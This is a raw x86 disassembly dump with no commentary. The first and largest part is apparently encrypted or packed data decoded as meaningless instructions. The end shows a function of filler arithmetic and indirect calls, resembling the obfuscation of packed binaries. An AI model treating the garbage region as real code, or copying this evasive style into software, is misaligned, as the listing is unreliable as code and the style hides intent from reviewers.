  40dc1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc1f:	enter  0x39f3,0xfe
  40dc23:	sbb    al,0xbb
  40dc25:	pop    esp
  40dc26:	repnz xor bh,BYTE PTR [ebx+0x3cedad22]
  40dc2d:	lahf   
  40dc2e:	ret    
  40dc2f:	call   0x1fde6a26
  40dc34:	and    BYTE PTR [edi],bh
  40dc36:	in     al,dx
  40dc37:	xchg   edi,eax
  40dc38:	shl    BYTE PTR [esi],1
  40dc3a:	push   edi
  40dc3b:	sbb    eax,0xeecdcac8
  40dc40:	out    0xc7,eax
  40dc42:	mov    ah,0x21
  40dc44:	mov    DWORD PTR [edi+ebp*8],ebp
  40dc47:	stos   DWORD PTR es:[edi],eax
  40dc48:	push   edi
  40dc49:	xchg   ebp,eax
  40dc4a:	xchg   BYTE PTR [ebx],ah
  40dc4c:	sub    ch,BYTE PTR [edi-0x4ad839fc]
  40dc52:	and    eax,DWORD PTR [eax+edi*1-0x1a]
  40dc56:	mov    ch,0x74
  40dc58:	sbb    eax,0xef931291
  40dc5d:	mov    DWORD PTR [ebp+0x68b791d6],ecx
  40dc63:	(bad)  
  40dc64:	mov    al,ds:0x192018a
  40dc69:	retf   0x709e
  40dc6c:	or     eax,0x84add796
  40dc71:	fsubr  QWORD PTR [ebp-0x2b65ddca]
  40dc77:	push   ds
  40dc78:	jmp    0x40dcea
  40dc7a:	ds (bad) 
  40dc7c:	xor    al,0xeb
  40dc7e:	in     eax,0xaa
  40dc80:	inc    BYTE PTR [ebx+0x5]
  40dc83:	int    0xdb
  40dc85:	in     al,0x3a
  40dc87:	sub    eax,0x65d3707d
  40dc8c:	data16 sub BYTE PTR [ebp+0x2ef721cd],0x9e
  40dc94:	js     0x40dcd6
  40dc96:	ja     0x40dc3c
  40dc98:	test   al,0xb8
  40dc9a:	out    dx,al
  40dc9b:	dec    edx
  40dc9c:	push   esi
  40dc9d:	mov    esi,0x7be67e3a
  40dca2:	mov    dl,0x43
  40dca4:	fiadd  WORD PTR [edx-0x1fb138fa]
  40dcaa:	retf   
  40dcab:	retf   
  40dcac:	mov    edx,0xbdea2116
  40dcb1:	push   eax
  40dcb2:	mov    cl,0x6b
  40dcb4:	pop    ds
  40dcb5:	pop    ebp
  40dcb6:	pop    esp
  40dcb7:	xor    eax,0xdbd671be
  40dcbc:	jnp    0x40dc65
  40dcbe:	xchg   esp,eax
  40dcbf:	pop    edx
  40dcc0:	sbb    al,0x80
  40dcc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcc3:	adc    ebp,esi
  40dcc5:	mov    eax,0x93c90630
  40dcca:	xchg   ecx,eax
  40dccb:	sbb    esi,esp
  40dccd:	mov    ch,0xdb
  40dccf:	stos   DWORD PTR es:[edi],eax
  40dcd0:	js     0x40dd41
  40dcd2:	ds in  eax,0xb6
  40dcd5:	cs call 0x9c33:0xadad14be
  40dcdd:	mov    esp,0x9eec29c4
  40dce2:	add    al,0xdb
  40dce4:	clc    
  40dce5:	or     ebx,eax
  40dce7:	inc    esi
  40dce8:	fimul  WORD PTR [edx-0x114f6f6c]
  40dcee:	xor    esi,DWORD PTR [edx]
  40dcf0:	lods   eax,DWORD PTR ds:[esi]
  40dcf1:	inc    esi
  40dcf2:	aad    0x72
  40dcf4:	push   esi
  40dcf5:	arpl   WORD PTR [edx],dx
  40dcf7:	sti    
  40dcf8:	test   DWORD PTR [ecx+0x5785e97f],ebx
  40dcfe:	push   es
  40dcff:	add    al,0xd4
  40dd01:	out    0x24,eax
  40dd03:	cdq    
  40dd04:	xor    cl,BYTE PTR [ecx+ebx*4-0x3a]
  40dd08:	mov    ah,0x7f
  40dd0a:	or     eax,0x208ff600
  40dd0f:	add    DWORD PTR [edx+0x50d535b5],ebx
  40dd15:	push   cs
  40dd16:	fcomp  DWORD PTR [edi]
  40dd18:	aas    
  40dd19:	sub    edx,DWORD PTR [ebx]
  40dd1b:	shr    BYTE PTR ds:0x67a26866,1
  40dd21:	xor    al,0xbd
  40dd23:	adc    DWORD PTR [esi],esp
  40dd25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd26:	adc    eax,0xf24f970c
  40dd2b:	pop    es
  40dd2c:	sub    al,0x23
  40dd2e:	out    0xef,al
  40dd30:	fcomp  DWORD PTR [edi]
  40dd32:	xor    DWORD PTR [ecx-0x21],esp
  40dd35:	in     eax,dx
  40dd36:	rcl    BYTE PTR [ecx+ebp*2-0x652b9a4e],1
  40dd3d:	iret   
  40dd3e:	in     al,dx
  40dd3f:	add    ecx,DWORD PTR [ebp+0x66]
  40dd42:	dec    edi
  40dd43:	pop    ds
  40dd44:	fwait
  40dd45:	and    bh,BYTE PTR [edi-0x52dfd7ec]
  40dd4b:	hlt    
  40dd4c:	mov    ebp,0xe805921a
  40dd51:	lds    edx,FWORD PTR [edi]
  40dd53:	pusha  
  40dd54:	iret   
  40dd55:	dec    ebp
  40dd56:	dec    edi
  40dd57:	inc    edi
  40dd58:	and    dh,BYTE PTR [ecx+0x41]
  40dd5b:	xlat   BYTE PTR ds:[ebx]
  40dd5c:	pop    ecx
  40dd5d:	xchg   edi,eax
  40dd5e:	sbb    al,0x46
  40dd60:	push   0xa0b9811
  40dd65:	adc    ah,dl
  40dd67:	dec    eax
  40dd68:	fsub   QWORD PTR [eax+0x7215c25b]
  40dd6e:	inc    edi
  40dd6f:	icebp  
  40dd70:	mov    bl,0x8d
  40dd72:	adc    BYTE PTR [edi],bl
  40dd74:	xchg   DWORD PTR [ecx],ecx
  40dd76:	xor    ch,BYTE PTR fs:[ecx]
  40dd79:	fdiv   QWORD PTR [edx]
  40dd7b:	xchg   BYTE PTR [ebx+esi*2-0x72f2e4ec],ah
  40dd82:	jbe    0x40dd42
  40dd84:	jno    0x40dd3b
  40dd86:	cld    
  40dd87:	xchg   edx,eax
  40dd88:	ds inc edx
  40dd8a:	cmc    
  40dd8b:	sbb    edi,eax
  40dd8d:	push   0xffffffd7
  40dd8f:	add    DWORD PTR [edi],ebp
  40dd91:	adc    al,0xb0
  40dd93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd94:	int    0x2f
  40dd96:	adc    BYTE PTR [ebx+edx*2+0x32],ah
  40dd9a:	hlt    
  40dd9b:	jbe    0x40ddbd
  40dd9d:	push   ebx
  40dd9e:	icebp  
  40dd9f:	pop    ecx
  40dda0:	jo     0x40dde2
  40dda2:	out    0x55,eax
  40dda4:	xchg   ebp,eax
  40dda5:	mov    eax,ds:0xfe08a04c
  40ddaa:	pushf  
  40ddab:	dec    ebx
  40ddac:	add    esi,ebx
  40ddae:	daa    
  40ddaf:	cmp    BYTE PTR ds:0x6bde0fcb,cl
  40ddb5:	adc    al,0xfc
  40ddb7:	mov    es,WORD PTR [ebx-0x18]
  40ddba:	xchg   ebp,eax
  40ddbb:	popf   
  40ddbc:	loopne 0x40ddfb
  40ddbe:	push   ds
  40ddbf:	js     0x40de23
  40ddc1:	jne    0x40de2a
  40ddc3:	call   0xf45c1cd
  40ddc8:	mov    es,ecx
  40ddca:	xor    BYTE PTR [esi],0xdc
  40ddcd:	aaa    
  40ddce:	popa   
  40ddcf:	(bad)  
  40ddd0:	or     eax,0xb79fef4a
  40ddd5:	mov    ah,0xf2
  40ddd7:	shr    BYTE PTR [edx-0x6cd00c3b],0x71
  40ddde:	fisubr DWORD PTR [edx]
  40dde0:	jbe    0x40ddfe
  40dde2:	fld    QWORD PTR [esi+0x35]
  40dde5:	out    dx,al
  40dde6:	arpl   WORD PTR [ecx],cx
  40dde8:	xlat   BYTE PTR ds:[ebx]
  40dde9:	leave  
  40ddea:	jge    0x40dd6f
  40ddec:	and    DWORD PTR [edi+0x736a55f8],ecx
  40ddf2:	add    BYTE PTR [edx-0x31],bl
  40ddf5:	xchg   ecx,eax
  40ddf6:	dec    esi
  40ddf7:	and    dh,BYTE PTR [ecx-0x4111feec]
  40ddfd:	stc    
  40ddfe:	pop    edi
  40ddff:	ss mov esi,ebp
  40de02:	jle    0x40de41
  40de04:	fsub   QWORD PTR [edi-0x5]
  40de07:	xchg   edi,edx
  40de09:	out    0x98,al
  40de0b:	js     0x40de6f
  40de0d:	fmul   QWORD PTR [ecx]
  40de0f:	jae    0x40de25
  40de11:	pop    eax
  40de12:	sub    DWORD PTR [eax+0xda7c812],ecx
  40de18:	popf   
  40de19:	inc    ebp
  40de1a:	out    dx,al
  40de1b:	pop    esi
  40de1c:	sbb    eax,DWORD PTR [edi]
  40de1e:	ret    0xc115
  40de21:	mov    bh,0x41
  40de23:	aad    0xc1
  40de25:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de27:	enter  0x887d,0xeb
  40de2b:	popa   
  40de2c:	cwde   
  40de2d:	aas    
  40de2e:	jb     0x40de7a
  40de30:	stos   DWORD PTR es:[edi],eax
  40de31:	shr    DWORD PTR [edi-0x7ddd6240],cl
  40de37:	cld    
  40de38:	cmp    ecx,DWORD PTR [edi+0x57]
  40de3b:	fdiv   DWORD PTR [ebx]
  40de3d:	or     bl,BYTE PTR [eax-0xc486e5e]
  40de43:	xor    al,0x26
  40de45:	sbb    eax,0x76ac6331
  40de4a:	rcl    DWORD PTR [ecx+ebp*1+0x47a297d8],0x9a
  40de52:	inc    eax
  40de53:	cmp    esi,DWORD PTR [ebx]
  40de55:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40de57:	hlt    
  40de58:	xchg   BYTE PTR [ecx+edx*8+0x684f9d02],dh
  40de5f:	xor    eax,0xfd33c9d
  40de64:	jno    0x40ddff
  40de66:	mov    bl,BYTE PTR [edi]
  40de68:	mov    al,0xf6
  40de6a:	rcr    BYTE PTR [edi+0x77],0xe
  40de6e:	mov    al,0x10
  40de70:	and    eax,0xb86bc73d
  40de75:	add    cl,BYTE PTR [ecx]
  40de77:	test   al,0x65
  40de79:	aas    
  40de7a:	jmp    ecx
  40de7c:	mov    cl,0x23
  40de7e:	(bad)  
  40de7f:	sbb    DWORD PTR [eax+ebx*8-0x60],ecx
  40de83:	lock or eax,0x4f780533
  40de89:	data16 cld 
  40de8b:	pop    esi
  40de8c:	sahf   
  40de8d:	fcmovne st,st(0)
  40de8f:	push   es
  40de90:	dec    BYTE PTR [edx+0x2e]
  40de93:	loope  0x40decd
  40de95:	mov    edi,0x4d45631
  40de9a:	fsubr  DWORD PTR [ecx-0x51a1b4d7]
  40dea0:	call   0x8cb8f42a
  40dea5:	lods   al,BYTE PTR ds:[esi]
  40dea6:	iret   
  40dea7:	sti    
  40dea8:	push   edi
  40dea9:	pop    ss
  40deaa:	sub    ebp,DWORD PTR [esp+ecx*4+0x1c00229a]
  40deb1:	pushf  
  40deb2:	pop    edi
  40deb3:	retf   0x375a
  40deb6:	and    bh,ah
  40deb8:	xor    DWORD PTR [edi+ebp*2+0x6d404fd0],esp
  40debf:	push   esi
  40dec0:	jne    0x40dee9
  40dec2:	and    eax,DWORD PTR [eax+0x26c8893f]
  40dec8:	js     0x40de61
  40deca:	enter  0x7012,0xc7
  40dece:	adc    dh,ah
  40ded0:	ret    0xfabe
  40ded3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ded4:	dec    ebx
  40ded5:	pop    ss
  40ded6:	ds and al,0x83
  40ded9:	gs enter 0xd1eb,0xc7
  40dede:	inc    edi
  40dedf:	imul   ebx,DWORD PTR [esi-0x39],0xd75c463c
  40dee6:	mov    ebx,ebp
  40dee8:	cwde   
  40dee9:	out    dx,al
  40deea:	and    ebx,esp
  40deec:	xchg   esi,eax
  40deed:	arpl   bx,di
  40deef:	sub    edi,esi
  40def1:	mov    eax,ds:0xff9a1256
  40def6:	test   eax,0x7ef404c5
  40defb:	xor    DWORD PTR [eax-0x3f90d010],ebx
  40df01:	push   esi
  40df02:	or     BYTE PTR [esi],ah
  40df04:	retf   
  40df05:	push   edi
  40df06:	inc    ebx
  40df07:	aas    
  40df08:	sbb    DWORD PTR [ebx-0x59],0xe909472f
  40df0f:	add    al,0x25
  40df11:	mov    edi,0x32d56321
  40df16:	jne    0x40df0f
  40df18:	idiv   DWORD PTR [eax+0x524f62ac]
  40df1e:	xor    DWORD PTR ss:[esi-0x6cdac111],ebx
  40df25:	ja     0x40df02
  40df27:	or     eax,0xc64b4fd3
  40df2c:	js     0x40df80
  40df2e:	addr16 (bad) 
  40df31:	cmp    al,0xf6
  40df33:	push   ecx
  40df34:	ficom  DWORD PTR [ebp+0x3cd9f084]
  40df3a:	cdq    
  40df3b:	xor    ah,BYTE PTR [eax-0x10]
  40df3e:	cmp    edi,DWORD PTR [edx]
  40df40:	outs   dx,DWORD PTR ds:[esi]
  40df41:	pop    edx
  40df42:	arpl   WORD PTR [ebx+0x53],dx
  40df45:	ret    0xdd80
  40df48:	das    
  40df49:	pop    ds
  40df4a:	scas   al,BYTE PTR es:[edi]
  40df4b:	mov    DWORD PTR [edx+esi*8-0x3b12a484],ebp
  40df52:	mov    cl,BYTE PTR [ecx]
  40df54:	adc    ecx,DWORD PTR [eax-0x32202dce]
  40df5a:	mov    ecx,0xb401013b
  40df5f:	mov    ecx,0x40bf8da2
  40df64:	jb     0x40df79
  40df66:	out    0x2f,eax
  40df68:	mov    ds:0xa787d23f,al
  40df6d:	cmp    esp,DWORD PTR [ecx+0x6b]
  40df70:	xlat   BYTE PTR ds:[ebx]
  40df71:	cmp    DWORD PTR [eax],edx
  40df73:	mov    ebx,0x7c5d4a2d
  40df78:	mov    dh,0x60
  40df7a:	sbb    al,0xf3
  40df7c:	imul   ebx,DWORD PTR [ebx+0x623ee530],0x4f44f368
  40df86:	add    al,0xe7
  40df88:	cwde   
  40df89:	leave  
  40df8a:	out    dx,eax
  40df8b:	dec    edi
  40df8c:	ficom  DWORD PTR [ecx-0x6ccd6a0a]
  40df92:	das    
  40df93:	inc    edi
  40df94:	xor    DWORD PTR ds:0xd41cf530,0xffffffa4
  40df9b:	aam    0x94
  40df9d:	xchg   edx,ecx
  40df9f:	xlat   BYTE PTR ds:[ebx]
  40dfa0:	lods   al,BYTE PTR ds:[esi]
  40dfa1:	test   esi,esp
  40dfa3:	cld    
  40dfa4:	hlt    
  40dfa5:	aaa    
  40dfa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dfa7:	xchg   BYTE PTR [ecx+0x80486cb],bh
  40dfad:	fsub   QWORD PTR [esi]
  40dfaf:	sub    BYTE PTR [eax+ebx*4],al
  40dfb2:	mov    ah,0xa8
  40dfb4:	les    edx,FWORD PTR [ebx+0x15]
  40dfb7:	mov    al,0x1f
  40dfb9:	gs xchg edi,eax
  40dfbb:	xor    BYTE PTR [ebp-0x26],bl
  40dfbe:	call   0xcb1c:0x8a373bd
  40dfc5:	retf   
  40dfc6:	add    cl,ch
  40dfc8:	sbb    ebp,DWORD PTR [ebx+0x42d15e37]
  40dfce:	in     al,dx
  40dfcf:	(bad)  
  40dfd0:	jp     0x40e01e
  40dfd2:	ins    BYTE PTR es:[edi],dx
  40dfd3:	in     al,dx
  40dfd4:	mov    dl,0x4a
  40dfd6:	les    eax,FWORD PTR [ebx-0x6b]
  40dfd9:	scas   al,BYTE PTR es:[edi]
  40dfda:	ds pop edi
  40dfdc:	cmp    ecx,DWORD PTR [edi+0x49]
  40dfdf:	cmp    ah,BYTE PTR [esi]
  40dfe1:	adc    bl,BYTE PTR [eax-0x5e]
  40dfe4:	sub    al,0x7e
  40dfe6:	push   edi
  40dfe7:	test   eax,0xf20c8f8d
  40dfec:	bound  ecx,QWORD PTR [edi]
  40dfee:	fimul  WORD PTR [edi]
  40dff0:	dec    eax
  40dff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dff2:	xor    BYTE PTR [ebx+0x72],ch
  40dff5:	and    DWORD PTR [ebx+0x12c55c87],ebx
  40dffb:	jge    0x40dfbc
  40dffd:	outs   dx,BYTE PTR ds:[esi]
  40dffe:	(bad)  
  40e000:	jle    0x40dfd7
  40e002:	fs pop ebx
  40e004:	mov    dh,0xea
  40e006:	sub    BYTE PTR [edx],bh
  40e008:	repz call 0x864:0xe8404417
  40e010:	cmp    al,0x78
  40e012:	or     eax,0xb022b870
  40e017:	cmp    bl,cl
  40e019:	(bad)  
  40e01a:	mov    eax,ds:0x243b8d0a
  40e01f:	push   eax
  40e020:	sbb    cl,BYTE PTR [edi+0x6a]
  40e023:	sbb    eax,0xc2cc0cdf
  40e028:	add    al,0xff
  40e02a:	mov    eax,0x24e0df70
  40e02f:	mov    esi,ebx
  40e031:	test   BYTE PTR [eax+0x22],dh
  40e034:	sbb    ebp,ebp
  40e036:	sbb    dh,BYTE PTR [ebx]
  40e038:	xchg   DWORD PTR [ebp-0x57],edx
  40e03b:	call   0xc170f401
  40e040:	ret    0x161b
  40e043:	mov    eax,ds:0x3cf754fe
  40e048:	mov    esi,0xc485d8af
  40e04d:	mov    ebp,0x24ebc483
  40e052:	ja     0x40dff5
  40e054:	jmp    0xa05d:0xb94ddc9f
  40e05b:	js     0x40dfee
  40e05d:	das    
  40e05e:	mov    dh,0xd7
  40e060:	mov    WORD PTR [edi+0x79],cs
  40e063:	loopne 0x40e088
  40e065:	fadd   DWORD PTR [esi+0x30]
  40e068:	aam    0x45
  40e06a:	call   0x168ae17a
  40e06f:	cmp    al,0x7e
  40e071:	fistp  DWORD PTR [edx-0x1d3fa304]
  40e077:	sbb    BYTE PTR [eax-0x5e497130],0x11
  40e07e:	sbb    dh,BYTE PTR [esi]
  40e080:	(bad)  
  40e081:	test   DWORD PTR [eax+0x18],0x8d6b312c
  40e088:	popf   
  40e089:	sub    ecx,edx
  40e08b:	stc    
  40e08c:	fdiv   DWORD PTR [edx]
  40e08e:	pop    edi
  40e08f:	push   ebp
  40e090:	sub    BYTE PTR fs:[ecx-0x20b3b3a4],dl
  40e097:	xchg   bh,cl
  40e099:	inc    ecx
  40e09a:	sar    BYTE PTR [esi-0x67],cl
  40e09d:	pop    eax
  40e09e:	cmp    dl,BYTE PTR ds:0x9268a1a0
  40e0a4:	cmp    al,0xb4
  40e0a6:	lods   al,BYTE PTR ds:[esi]
  40e0a7:	jnp    0x40e0d3
  40e0a9:	push   0xffffff86
  40e0ab:	idiv   dh
  40e0ad:	and    al,BYTE PTR [edx+eax*8]
  40e0b0:	and    BYTE PTR [eax-0x4f],bh
  40e0b3:	js     0x40e05f
  40e0b5:	inc    eax
  40e0b6:	xchg   DWORD PTR [edi],edi
  40e0b8:	jb     0x40e116
  40e0ba:	aam    0x6e
  40e0bc:	es xor al,0x9c
  40e0bf:	repz xor esi,DWORD PTR [eax-0x31]
  40e0c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0c5:	mov    cl,0x55
  40e0c7:	ror    ah,1
  40e0c9:	cmp    BYTE PTR [eax-0x62],dl
  40e0cc:	push   0xd5d43fd8
  40e0d1:	pop    ds
  40e0d2:	inc    eax
  40e0d3:	pusha  
  40e0d4:	stc    
  40e0d5:	test   al,0xbf
  40e0d7:	sbb    BYTE PTR [esi],bh
  40e0d9:	pop    edx
  40e0da:	loopne 0x40e0b0
  40e0dc:	xlat   BYTE PTR ds:[ebx]
  40e0dd:	sub    edx,eax
  40e0df:	push   esp
  40e0e0:	mov    dl,0x0
  40e0e2:	imul   ecx,DWORD PTR [edx],0xffffffbc
  40e0e5:	jmp    0x8b643d5b
  40e0ea:	push   cs
  40e0eb:	jl     0x40e0b1
  40e0ed:	xchg   BYTE PTR ds:0x44e213df,ah
  40e0f3:	mov    ds:0xb3ba9ed2,al
  40e0f8:	mov    ch,0x71
  40e0fa:	push   ecx
  40e0fb:	push   eax
  40e0fc:	mov    bl,0xed
  40e0fe:	jle    0x40e0cd
  40e100:	pop    esi
  40e101:	ds stos BYTE PTR es:[edi],al
  40e103:	cmp    cl,ch
  40e105:	adc    cl,BYTE PTR [ebx-0x58]
  40e108:	imul   ebp,DWORD PTR [eax],0x22
  40e10b:	jg     0x40e10a
  40e10d:	gs (bad) 
  40e10f:	outs   dx,BYTE PTR ds:[esi]
  40e110:	cdq    
  40e111:	sub    al,0xee
  40e113:	ret    0xfb61
  40e116:	add    ebp,DWORD PTR [ebx+0x6b7f882b]
  40e11c:	sahf   
  40e11d:	repnz xor eax,0xcdaab908
  40e123:	mov    esi,0x91b9f6f8
  40e128:	inc    edi
  40e129:	outs   dx,BYTE PTR ds:[esi]
  40e12a:	pop    eax
  40e12b:	add    BYTE PTR [ecx+0x345ade9c],ch
  40e131:	xlat   BYTE PTR ds:[ebx]
  40e132:	idiv   BYTE PTR [esp+esi*4]
  40e135:	dec    ecx
  40e136:	add    edi,DWORD PTR [ecx-0x22b24003]
  40e13c:	xchg   ecx,eax
  40e13d:	into   
  40e13e:	and    DWORD PTR [eax+ecx*8],ebx
  40e141:	jp     0x40e10f
  40e143:	pop    ss
  40e144:	mov    edx,0xf9bc843b
  40e149:	xchg   edi,eax
  40e14a:	retf   
  40e14b:	pop    ecx
  40e14c:	pop    eax
  40e14d:	in     eax,0x9b
  40e14f:	call   0x9f2:0x8cfb0ec6
  40e156:	into   
  40e157:	aad    0x2c
  40e159:	leave  
  40e15a:	xchg   edi,eax
  40e15b:	std    
  40e15c:	sti    
  40e15d:	mov    es,WORD PTR [ebp+0x59acaa28]
  40e163:	cmp    eax,eax
  40e165:	jo     0x40e192
  40e167:	fwait
  40e168:	das    
  40e169:	test   eax,0x846ac0e0
  40e16e:	pop    edi
  40e16f:	dec    esp
  40e170:	pop    edx
  40e171:	xor    al,0x16
  40e173:	ret    0xc407
  40e176:	mov    ds:0x9a69be3a,eax
  40e17b:	inc    esi
  40e17c:	mov    edx,DWORD PTR ds:0xef777435
  40e182:	ror    DWORD PTR [esi],cl
  40e184:	loop   0x40e149
  40e186:	mov    ebx,0x69a83082
  40e18b:	mov    ch,0x37
  40e18d:	dec    edi
  40e18e:	sub    ebp,DWORD PTR [edi-0x4b]
  40e191:	push   ebp
  40e192:	mov    ebx,0x965a05b
  40e197:	add    eax,0x4d5e635e
  40e19c:	in     eax,0xf4
  40e19e:	jb     0x40e202
  40e1a0:	pop    ebx
  40e1a1:	leave  
  40e1a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1a3:	stc    
  40e1a4:	mov    ds:0xcf5be8fb,al
  40e1a9:	aaa    
  40e1aa:	test   DWORD PTR [esi+0x61],ebx
  40e1ad:	or     al,0x68
  40e1af:	lock popa 
  40e1b1:	xchg   edi,eax
  40e1b2:	sti    
  40e1b3:	inc    edi
  40e1b4:	cmc    
  40e1b5:	mov    cl,0x22
  40e1b7:	test   BYTE PTR [edx],cl
  40e1b9:	arpl   WORD PTR [ebp+0x13b7113],si
  40e1bf:	adc    DWORD PTR [edi-0x68],esp
  40e1c2:	les    ebp,FWORD PTR [edx-0x34]
  40e1c5:	into   
  40e1c6:	loopne 0x40e15e
  40e1c8:	pop    edi
  40e1c9:	adc    edi,DWORD PTR [edi+edx*2+0x1bbbd426]
  40e1d0:	pusha  
  40e1d1:	sub    eax,0x12753510
  40e1d6:	pop    ss
  40e1d7:	repnz xor DWORD PTR [edx-0x25c2f525],edx
  40e1de:	dec    ecx
  40e1df:	xchg   bh,dl
  40e1e1:	xor    ecx,DWORD PTR [esi+eax*4+0x2278c5d7]
  40e1e8:	jl     0x40e1cd
  40e1ea:	fstp   DWORD PTR [ebp+0x7498a2fd]
  40e1f0:	fild   DWORD PTR [esi+ebx*2-0x30c6d0eb]
  40e1f7:	cld    
  40e1f8:	pop    eax
  40e1f9:	arpl   dx,si
  40e1fb:	inc    edi
  40e1fc:	push   ds
  40e1fd:	scas   eax,DWORD PTR es:[edi]
  40e1fe:	push   ss
  40e1ff:	dec    ecx
  40e200:	xor    al,BYTE PTR [ecx+0x35228cbf]
  40e206:	fs jmp 0x145c:0xefc7e152
  40e20e:	bound  esi,QWORD PTR [esi-0x5dab1878]
  40e214:	ins    DWORD PTR es:[edi],dx
  40e215:	ds out 0x9b,eax
  40e218:	retf   0x912
  40e21b:	xchg   ecx,eax
  40e21c:	dec    ebx
  40e21d:	cld    
  40e21e:	rol    dh,cl
  40e220:	lahf   
  40e221:	xlat   BYTE PTR es:[ebx]
  40e223:	pop    edi
  40e224:	out    dx,eax
  40e225:	add    ch,dl
  40e227:	mov    al,ds:0xf5ce64ad
  40e22c:	ss repnz fimul DWORD PTR fs:[eax-0x45]
  40e232:	push   esi
  40e233:	jne    0x40e1b9
  40e235:	repnz rcl DWORD PTR ds:0x42cf15cc,cl
  40e23c:	add    al,0x89
  40e23e:	inc    esi
  40e23f:	or     dh,bl
  40e241:	out    0xd,al
  40e243:	or     DWORD PTR [ebx],edi
  40e245:	jmp    0xaa52352
  40e24a:	or     DWORD PTR [ebx+0x6c],0x3a
  40e24e:	cdq    
  40e24f:	pop    ebp
  40e250:	jge    0x40e1da
  40e252:	push   eax
  40e253:	lahf   
  40e254:	xlat   BYTE PTR ds:[ebx]
  40e255:	addr16 mov bh,0x92
  40e258:	mov    ch,0xdf
  40e25a:	mov    ch,0x8b
  40e25c:	dec    ebp
  40e25d:	xor    ebp,DWORD PTR [ebx+0x20b991cb]
  40e263:	retf   0xb9e5
  40e266:	xchg   edx,eax
  40e267:	push   eax
  40e268:	xor    ebx,ebx
  40e26a:	mov    edx,esp
  40e26c:	dec    edx
  40e26d:	inc    ebx
  40e26e:	add    ebx,DWORD PTR [edx+ebx*1]
  40e271:	dec    ebx
  40e272:	xor    edx,edx
  40e274:	add    DWORD PTR [ebp-0x10],ebx
  40e277:	pop    ebx
  40e278:	mov    eax,DWORD PTR [ebp-0x10]
  40e27b:	pop    edi
  40e27c:	pop    esi
  40e27d:	pop    ebx
  40e27e:	leave  
  40e27f:	ret    0x10
  40e282:	push   ebp
  40e283:	mov    ebp,esp
  40e285:	sub    esp,0x7c
  40e288:	mov    ecx,DWORD PTR ds:0x42e008
  40e28e:	or     ecx,DWORD PTR ds:0x42f004
  40e294:	mov    DWORD PTR ds:0x42e008,ecx
  40e29a:	push   esi
  40e29b:	push   edi
  40e29c:	mov    eax,ds:0x4342d7
  40e2a1:	sbb    edi,ecx
  40e2a3:	mov    DWORD PTR [ebp-0x24],eax
  40e2a6:	and    DWORD PTR ds:0x42f00c,edx
  40e2ac:	mov    eax,ds:0x4343e3
  40e2b1:	adc    DWORD PTR ds:0x431014,edi
  40e2b7:	mov    DWORD PTR [ebp-0x34],eax
  40e2ba:	mov    edi,DWORD PTR ds:0x430018
  40e2c0:	and    DWORD PTR ds:0x42e004,edi
  40e2c6:	and    DWORD PTR [ebp-0x30],0x0
  40e2ca:	mov    DWORD PTR [ebp-0x2c],0xf89c8581
  40e2d1:	sbb    esi,0xb54
  40e2d7:	mov    DWORD PTR [ebp-0x28],0xf89c8580
  40e2de:	sbb    DWORD PTR ds:0x42e000,ecx
  40e2e4:	mov    eax,DWORD PTR [ebp-0x10]
  40e2e7:	mov    ecx,DWORD PTR [ebp-0x10]
  40e2ea:	neg    esi
  40e2ec:	sub    eax,ecx
  40e2ee:	xor    ecx,ecx
  40e2f0:	add    ecx,DWORD PTR ds:0x41d056
  40e2f6:	mov    esi,DWORD PTR ds:0x433018
  40e2fc:	sub    ecx,esi
  40e2fe:	add    ecx,DWORD PTR [ecx+esi*1]
  40e301:	mov    DWORD PTR [ebp-0x10],eax
  40e304:	xor    ecx,ecx
  40e306:	xor    DWORD PTR [ebp-0x10],0xf89cb581
  40e30d:	sub    edi,ecx
  40e30f:	mov    eax,DWORD PTR [ebp-0x18]
  40e312:	and    DWORD PTR ds:0x42e01c,0x0
  40e31c:	mov    esi,DWORD PTR ds:0x42e01c
  40e322:	inc    esi
  40e323:	mov    DWORD PTR ds:0x42e01c,esi
  40e329:	cmp    DWORD PTR ds:0x42e01c,0xe
  40e330:	ja     0x40e387
  40e336:	jmp    0x40e360
  40e33b:	push   DWORD PTR [ebp-0x10]
  40e33e:	push   DWORD PTR [ebp-0x1c]
  40e341:	push   0x636c
  40e346:	push   0x42e004
  40e34b:	push   0x225f
  40e350:	push   0x5da7
  40e355:	push   0x835e
  40e35a:	call   DWORD PTR ds:0x4348eb
  40e360:	cmp    DWORD PTR ds:0x42e01c,0xd
  40e367:	jne    0x40e37a
  40e36d:	mov    esi,DWORD PTR ds:0x42e01c
  40e373:	inc    esi
  40e374:	mov    DWORD PTR ds:0x42e01c,esi
  40e37a:	cmp    DWORD PTR ds:0x42e01c,0x1e
  40e381:	jb     0x40e31c
  40e387:	mov    ecx,DWORD PTR [ebp-0x18]
  40e38a:	and    DWORD PTR ds:0x431010,0x0
  40e394:	jmp    0x40e3a8
  40e399:	xor    edi,edi
  40e39b:	xor    edi,DWORD PTR ds:0x431010
  40e3a1:	inc    edi
  40e3a2:	mov    DWORD PTR ds:0x431010,edi
  40e3a8:	cmp    DWORD PTR ds:0x431010,0x16
  40e3af:	jae    0x40e3e6
  40e3b5:	cmp    DWORD PTR ds:0x431010,0x1b
  40e3bc:	jle    0x40e3e6
  40e3c2:	jmp    0x40e3e1
  40e3c7:	push   0x430014
  40e3cc:	push   0x208f
  40e3d1:	push   0x8122
  40e3d6:	push   0x265c
  40e3db:	call   DWORD PTR ds:0x4348bf
  40e3e1:	jmp    0x40e399
  40e3e6:	sub    eax,ecx
  40e3e8:	mov    DWORD PTR [ebp-0x18],eax
  40e3eb:	and    DWORD PTR ds:0x42f018,0x0
  40e3f5:	xor    ecx,ecx
  40e3f7:	xor    ecx,DWORD PTR ds:0x42f018
  40e3fd:	inc    ecx
  40e3fe:	mov    DWORD PTR ds:0x42f018,ecx
  40e404:	cmp    DWORD PTR ds:0x42f018,0x2a
